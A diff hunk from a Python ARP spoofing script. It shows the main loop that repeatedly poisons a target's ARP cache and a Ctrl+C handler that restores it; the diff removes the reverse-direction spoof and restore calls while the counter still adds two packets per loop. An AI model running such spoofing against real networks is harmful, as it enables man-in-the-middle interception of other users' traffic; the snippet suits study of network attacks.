@@ -41,11 +41,9 @@ options = get_args()
 try: 
     while True:
         spoof(options.target_ip, options.spoof_ip)
-        spoof(options.spoof_ip, options.target_ip)
         sent_packet_count += 2
         print("[+] Packets sent: " + str(sent_packet_count), end='\r')
         time.sleep(2)
 except KeyboardInterrupt: 
     print(" [+] Detected CRT + C ........ Restoring ARP")
     restore(options.spoof_ip, options.target_ip)
-    restore(options.target_ip, options.spoof_ip)
